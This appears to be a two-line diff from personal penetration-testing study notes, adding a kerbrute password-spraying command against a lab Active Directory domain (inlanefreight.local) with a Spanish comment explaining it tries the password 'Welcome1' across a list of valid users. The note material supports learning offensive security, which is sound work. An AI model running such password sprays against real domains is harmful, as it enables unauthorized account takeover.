@@ -1,0 +1,2 @@
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt  Welcome1
+#Con una lista de usuarios validos, permite hacer password sprying a esas cuentas con la contrasena 'Welcome1' en este caso
